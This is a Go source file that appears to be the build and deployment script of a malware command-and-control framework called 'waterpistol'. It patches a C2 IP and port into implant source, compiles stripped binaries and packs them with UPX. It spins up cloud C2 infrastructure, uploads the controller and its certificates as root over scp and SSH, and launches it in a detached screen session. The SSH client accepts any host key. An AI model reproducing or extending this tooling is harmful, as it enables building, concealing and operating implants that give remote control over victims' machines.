package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strconv"
	"strings"

	"golang.org/x/crypto/ssh"
)

func checkError(err error) {
	if err != nil {
		panic(err)
	}
}

func (waterpistol *waterpistol) preprocess_file(data []byte) []byte {
	sdata := string(data)

	// Replace imports
	sdata = strings.Replace(sdata, "malware/", waterpistol.srcid+"/", -1)

	sdata = strings.Replace(sdata, "_C2_IP_", waterpistol.ip, -1)
	sdata = strings.Replace(sdata, "_C2_PORT_", strconv.Itoa(waterpistol.port), -1)

	modules_create := ""
	modules_import := ""
	for _, module := range waterpistol.modules {
		modules_create += module + ".Create(),\n"
		modules_import += "\"" + waterpistol.srcid + "/implant/" + module + "\"\n"
	}
	sdata = strings.Replace(sdata, "_INCLUDED_MODULES_IMPORT_", modules_import, -1)
	sdata = strings.Replace(sdata, "_INCLUDED_MODULES_", modules_create, -1)

	return []byte(sdata)
}

func (waterpistol *waterpistol) visit(path string, f os.FileInfo, err error) error {
	newpath := waterpistol.srcdir + "/" + path
	if f.IsDir() {
		os.MkdirAll(newpath, os.ModePerm)
	} else {
		input, err := ioutil.ReadFile(path)
		if err != nil {
			return err
		}

		data := waterpistol.preprocess_file(input)

		err = ioutil.WriteFile(newpath, data, 0644)
		return err
	}

	return nil
}

func (waterpistol *waterpistol) compile(program string) (string, error) {
	tmpfile, err := ioutil.TempFile("", "*.bin")
	if err != nil {
		return "", err
	}

	out, err := exec.Command("go", "build", "-o", tmpfile.Name(), "-ldflags", "-s -w", program).CombinedOutput()

	if err != nil {
		log.Println(string(out))
	}

	out, err = exec.Command("upx", tmpfile.Name()).CombinedOutput()

	if err != nil {
		log.Println(string(out))
		return "", err
	}

	return tmpfile.Name(), nil
}

// Gen ssh keys + ec2 ip
func (waterpistol *waterpistol) generate_c2_ip() (string, string) {
	cmd := exec.Command("bash", "./c2_up")

	log.Println("Bringing up c2 infra")
	ip, err := cmd.Output()

	if ip == nil {
		return "", ""
	}

	usr, err := user.Current()

	if err != nil {
		log.Fatal(err)
	}

	return string(ip), fmt.Sprintf("%s/.ssh/id_c2", usr.HomeDir)
}

func (waterpistol *waterpistol) uploadC2(loc string, priv_key string) error {
	cmd := exec.Command("scp", loc, "root@"+waterpistol.ip+":~/c2")

	log.Println("Uploading c2")
	if err := cmd.Run(); err != nil {
		return err
	}

	cmd = exec.Command("scp", waterpistol.srcdir+"/cert.pem", "root@"+waterpistol.ip+":~/cert.pem")
	if err := cmd.Run(); err != nil {
		return err
	}
	cmd = exec.Command("scp", waterpistol.srcdir+"/key.pem", "root@"+waterpistol.ip+":~/key.pem")
	if err := cmd.Run(); err != nil {
		return err
	}
	log.Println("Crts uploaded")

	buffer, err := ioutil.ReadFile(priv_key)
	if err != nil {
		return err
	}

	key, err := ssh.ParsePrivateKey(buffer)
	if err != nil {
		return err
	}

	sshConfig := &ssh.ClientConfig{
		User: "root",
		Auth: []ssh.AuthMethod{ssh.PublicKeys(key)},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
	}
	log.Println("Connecting to c2 ssh")
	connection, err := ssh.Dial("tcp", waterpistol.ip+":22", sshConfig)
	if err != nil {
		return err
	}

	session, err := connection.NewSession()
	if err != nil {
		return err
	}
	err = session.Run("screen -d -m -S c2 ./c2 cert.pem key.pem ")
	if err != nil {
		return err
	}
	return nil
}

func (waterpistol *waterpistol) compile_c2_implant() {
	// Generate cert/key
	// Generate IP for c2
	// Copy source to /tmp dir
	// Preprocess %keys%, %options%
	// build and copy binaries somewhere
	// Upload and run c2 binary

	// Create temp dir
	tmpdir, err := ioutil.TempDir(os.Getenv("GOPATH"), "src/waterpistol")
	id := strings.Split(tmpdir, "src/")[1]

	checkError(err)

	log.Println("Tmp dir created", tmpdir)
	defer os.RemoveAll(tmpdir)

	waterpistol.srcdir = tmpdir
	waterpistol.srcid = id

	// Genereate ec2
	c2_ip, c2_priv_key_file := waterpistol.generate_c2_ip()
	if c2_ip == "" {
		panic("Got empty c2 ip, spinup failed")
	}

	waterpistol.ip = c2_ip
	waterpistol.port = (rand.Int() % 10000) + 5000 // Port between 5->35000

	// Copy source for implant and c2
	checkError(filepath.Walk("implant", waterpistol.visit))
	checkError(filepath.Walk("c2", waterpistol.visit))
	checkError(filepath.Walk("common", waterpistol.visit))

	log.Println("Source copied")

	GenCerts(waterpistol.srcdir)
	log.Println("Certs generated")

	implant, err := waterpistol.compile(id + "/implant")
	checkError(err)
	log.Println("Binary implant: ", implant)

	c2, err := waterpistol.compile(id + "/c2")
	checkError(err)
	log.Println("Binary c2: ", c2)

	checkError(waterpistol.uploadC2(c2, c2_priv_key_file))

}
